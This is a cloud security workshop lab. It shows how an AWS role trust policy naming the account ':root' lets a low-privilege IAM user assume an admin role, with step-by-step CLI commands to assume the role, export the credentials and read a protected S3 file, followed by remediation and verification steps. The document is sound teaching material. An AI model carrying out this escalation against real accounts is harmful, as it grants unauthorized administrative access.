# Lab 3: Trust Policy Abuse — Privilege Escalation via Permissive Role Trust

## Scenario 2: Trust Policy `:root` — Privilege Escalation via Permissive Role Trust

**Category:** Principal Access
**Starting Identity:** `iamws-role-assumer-user`
**Target:** Crown jewels via assuming `iamws-privileged-admin-role`

**The Vulnerability:** `iamws-privileged-admin-role` has a trust policy that specifies `arn:aws:iam::ACCOUNT_ID:root` as the trusted principal. Despite looking like it restricts access to the root user, `:root` in a trust policy means any principal in the account with `sts:AssumeRole` permission can assume this role.

**Real-world scenario:**
- A trust policy with `Principal: { "AWS": "arn:aws:iam::ACCOUNT_ID:root" }` is a common, documented pattern for *cross-account* role delegation. It trusts the partner account as a whole, and that account's administrators decide which of their principals has `sts:AssumeRole` permissions to assume the role.
- An engineer writing a trust policy mistakenly copies this snippet from AWS docs or an internal Terraform module and replaces `ACCOUNT_ID` with their own same-account ID.
- As designed, the trust policy now trusts the *entire* account. Any identity in the account that has `sts:AssumeRole` permission for that role can assume it.
- If policies attached to other roles or users in the account are broad (and they often are, for example `sts:AssumeRole` on `Resource: "*"`, or managed policies like `AdministratorAccess`), a single compromised low-privilege identity can assume the role's permissions, potentially achieving full account takeover.
- **Fix:** name the specific role or user ARN as the principal, or keep `:root` and add a condition such as `aws:PrincipalArn`.

### A note on the identities you'll switch between

This lab moves between three identities. Keep this straight as you go (see Lab 1 for the full roster):

| Identity | What it is | When you use it |
| --- | --- | --- |
| `iamws-role-assumer-user` | The attacker. A low-privilege user that happens to hold `sts:AssumeRole`. | Parts A & C: recon and the exploit |
| (temporary env-var credentials) | A session for `iamws-privileged-admin-role`, obtained by calling `sts:AssumeRole`. | Inside Part C, Steps 4–5, after you export the returned credentials into `AWS_*` env vars |
| `iamws-lab-default` | Your admin identity (acting as the defender). | Part D & E: applying and verifying the fix, and refreshing the recon graph |

> [!TIP]
> In Part C you authenticate by *exporting* the assumed-role credentials as environment variables rather than with a `--profile` flag. Environment variables take precedence over profiles, so until you `unset` them (Part D, Step 1) every `aws` command runs as the privileged role — even ones without a `--profile`.

### Part A: Identify with iam-recon

Run the `iam-recon` privilege escalation preset to identify priv esc paths available to the `iamws-role-assumer-user`:

```bash
iam-recon --account $ACCOUNT_ID argquery --preset privesc --principal user/iamws-role-assumer-user
```

Expected output:
```
  user/iamws-role-assumer-user can escalate to admin:
    arn:aws:iam::<aws account id>:user/iamws-role-assumer-user user/iamws-role-assumer-user can assume role/iamws-privileged-admin-role arn:aws:iam::<aws account id>:role/iamws-privileged-admin-role
```

`iam-recon` flags that `iamws-role-assumer-user` can reach the admin-tier `iamws-privileged-admin-role` via `sts:AssumeRole`.

Confirm the specific action directly:

```bash
iam-recon --account $ACCOUNT_ID argquery \
  --principal user/iamws-role-assumer-user \
  --action sts:AssumeRole \
  --resource 'arn:aws:iam::*:role/iamws-privileged-admin-role'
```

Expected output:
```
ALLOW user/iamws-role-assumer-user can call sts:AssumeRole with arn:aws:iam::*:role/iamws-privileged-admin-role
```

Cross-reference with pathfinding.cloud's known path database. Use `--principal` to filter to just this identity instead of scrolling through every match in the graph:

```bash
iam-recon --account $ACCOUNT_ID pathfinding \
  --principal user/iamws-role-assumer-user
```

Expected output:
```
Pathfinding.cloud
  Database: N known escalation paths bundled

  user/iamws-role-assumer-user — 1 paths matched:

  [sts-001] sts:AssumeRole (principal-access)
    Permissions: sts:AssumeRole
    https://www.pathfinding.cloud/paths/sts-001
```

**In the interactive visualization:**

- Search for `iamws-role-assumer-user`.
- You'll see an orange `iamws-role-assumer-user` node with an **STS** edge leading to the `iamws-privileged-admin-role` red admin role.
- Click the `iamws-role-assumer-user` node, under **policies** click the `iamws-role-assumer-policy`, `iam-recon` displays the policy inline.
- `iam-recon` highlights that this policy, attached to the user, has `sts:AssumeRole` permissions with `resource:*`.
- Close the `iamws-role-assumer-policy` window and return to the graph.
- Click the red `iamws-privileged-admin-role` admin role node and click the box labeled `role/iamws-privileged-admin-role-trust` — `iam-recon` displays the trust policy inline, showing `:root` as the trusted principal.

### Part B: Understand the Attack

Visit [pathfinding.cloud/paths/sts-001](https://pathfinding.cloud/paths/sts-001):

- **Category:** Principal Access
- **Required permission:** `sts:AssumeRole` on the caller's identity policy **plus** a permissive trust policy on the target role
- **Root cause:** Trust policy specifies `:root` instead of specific principals
- **Impact:** Any principal in the account with unscoped `sts:AssumeRole` can assume an admin-tier role

> [!IMPORTANT]
> Make sure that you understand the two things this attack requires:
> 1. The starting user/role must have permission to do the `sts:AssumeRole` action and
> 1. The **target role's trust policy** must allow the starting user/role to assume the role. Remember that trust policies are resource policies attached to the role itself.

### Part C: Exploit the Vulnerability

**Step 1: Confirm your low-privilege identity**

```bash
aws sts get-caller-identity --profile iamws-role-assumer-user
```

Expected output:
```json
{
    "UserId": "AIDA<user id>",
    "Account": "<aws account id>",
    "Arn": "arn:aws:iam::<aws account id>:user/iamws-role-assumer-user"
}
```

You're operating as the `iamws-role-assumer-user` IAM user.

**Step 2: Try the crown jewels directly — you're denied**

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-role-assumer-user
```

Expected output:
```
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

The `iamws-role-assumer-user` can't reach the crown jewels directly, but as you know, `iamws-role-assumer-user` has a path to `iamws-privileged-admin-role` via `sts:AssumeRole`. Time to exploit that path and get access to the crown jewels.

**Step 3 (Optional): Inspect the vulnerable trust policy via the AWS CLI**

You can use the AWS CLI to inspect the target role trust policy just as you did in `iam-recon`.

```bash
aws iam get-role --role-name iamws-privileged-admin-role \
  --query 'Role.AssumeRolePolicyDocument' --output json \
  --profile iamws-role-assumer-user
```

Expected output:
```json
{
    "Version": "2012-10-17",
    "Statement": [{
        "Effect": "Allow",
        "Principal": { "AWS": "arn:aws:iam::<aws account id>:root" },
        "Action": "sts:AssumeRole"
    }]
}
```

**Step 4: Assume the privileged admin role**

Run the following command to use `sts:AssumeRole` to return credentials for a session with `iamws-privileged-admin-role`.

```bash
ADMIN_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-privileged-admin-role \
  --role-session-name escalated \
  --query "Credentials" --output json \
  --profile iamws-role-assumer-user)
```

You can echo $ADMIN_CREDS to understand what `sts:AssumeRole` returned.

```
echo $ADMIN_CREDS
```

Configure local environment variables with the temporary credentials, this will authenticate the AWS CLI as the `iamws-privileged-admin-role` for future commands.

```
export AWS_ACCESS_KEY_ID=$(echo $ADMIN_CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $ADMIN_CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $ADMIN_CREDS | jq -r '.SessionToken')
```

**Step 5: Claim the crown jewels with elevated credentials**

Confirm you are now running AWS commands as the `iamws-privileged-admin-role`

```bash
aws sts get-caller-identity
```

Expected output:
```json
{
    "UserId": "AROA<role id>:escalated",
    "Account": "<aws account id>",
    "Arn": "arn:aws:sts::<aws account id>:assumed-role/iamws-privileged-admin-role/escalated"
}
```

> [!NOTE]
> `escalated` is the role session name. You named the session earlier in step 4 when you ran the `assume-role` command with the `--role-session-name` argument.

Try to access the crowned jewels again.

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt -
```

The file contents appear — you escalated to a role with `AdministratorAccess` and can access the sensitive files!

### Part D: Apply a defense

**Step 1: Clean up the escalated session**

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

Confirm you're back to `iamws-lab-default`.

```
aws sts get-caller-identity
```

Expected output:
```
{
    "UserId": "AIDA<user id>",
    "Account": "<aws account id>",
    "Arn": "arn:aws:iam::<aws account id>:user/iamws-lab-default"
}
```

> [!NOTE]
> You will use your lab admin identity `iamws-lab-default`, not the scenario identity `iamws-role-assumer-user` to make updates to the vulnerable policies, acting the way a defender might.

**Step 2: Harden the role trust policy — replace `:root` with a specific principal**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
ADMIN_ROLE_ARN=$(aws sts get-caller-identity --query Arn --output text)

aws iam update-assume-role-policy \
  --role-name iamws-privileged-admin-role \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"AWS": "'$ADMIN_ROLE_ARN'"},
      "Action": "sts:AssumeRole"
    }]
  }'
```

What this changes:
1. **Scopes the `principal` clause to a specific principal:** Only your admin identity can assume the role — eliminates the `:root` vulnerability.

### Part E: Verify the Remediation

**Step 1: Confirm that `iamws-role-assumer-user` can no longer assume `iamws-privileged-admin-role`**

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-privileged-admin-role \
  --role-session-name escalated \
  --profile iamws-role-assumer-user
```

Expected output:
```
An error occurred (AccessDenied) when calling the AssumeRole operation:
User: arn:aws:iam::<aws account id>:user/iamws-role-assumer-user
is not authorized to perform: sts:AssumeRole on resource:
arn:aws:iam::<aws account id>:role/iamws-privileged-admin-role
```

The attack is blocked.

**Step 2: Verify with iam-recon**

Because of your changes, you need to refresh the `iam-recon` graph.

```bash
iam-recon graph create --profile iamws-lab-default
```

Re-run the privesc preset scoped to the scenario principal.

```bash
iam-recon --account $ACCOUNT_ID argquery --preset privesc --principal user/iamws-role-assumer-user
```

Expected output:
```
  user/iamws-role-assumer-user cannot escalate to admin.
```

The STS edge to `iamws-privileged-admin-role` is gone.

> [!NOTE]
> Running `argquery --principal user/iamws-role-assumer-user --action sts:AssumeRole --resource <role-arn>` will still return `ALLOW` after the defense. iam-recon's per-action query only checks the caller's identity policy, not the role's trust policy. AWS `simulate-principal-policy` has the same limitation by design. The live `aws sts assume-role` attempt and the disappearance of the STS edge in `argquery --preset privesc` are the two authoritative verifications.

**In the interactive visualization:** search for `privileged-admin-role`. The STS edge between `iamws-role-assumer-user` and `iamws-privileged-admin-role` is gone. Click the role node — the inspect panel shows `iamws-privileged-admin-role-trust` under **TRUST** (clickable). Note: iam-recon's viz flags this trust policy as "1 RISK" even after hardening — this is cosmetic; the absent STS edge is the authoritative signal.

### What You Learned

- How to escalate privileges from a lesser privileged IAM user to a privileged Admin role
- Trust policies that specify `:root` trust every principal in the account — not just the AWS root user.
- For `sts:AssumeRole` to work, the starting identity must have `sts:AssumeRole` permissions and the target role must have a trust policy that includes the starting identity as a principal
- Any principal that can assume an IAM role can use the full set of permissions attached to that role.

---

**Next:** [Lab 4: Permissions Boundaries & Condition Keys](../lab-4-permissions-boundaries-and-condition-keys/README.md)
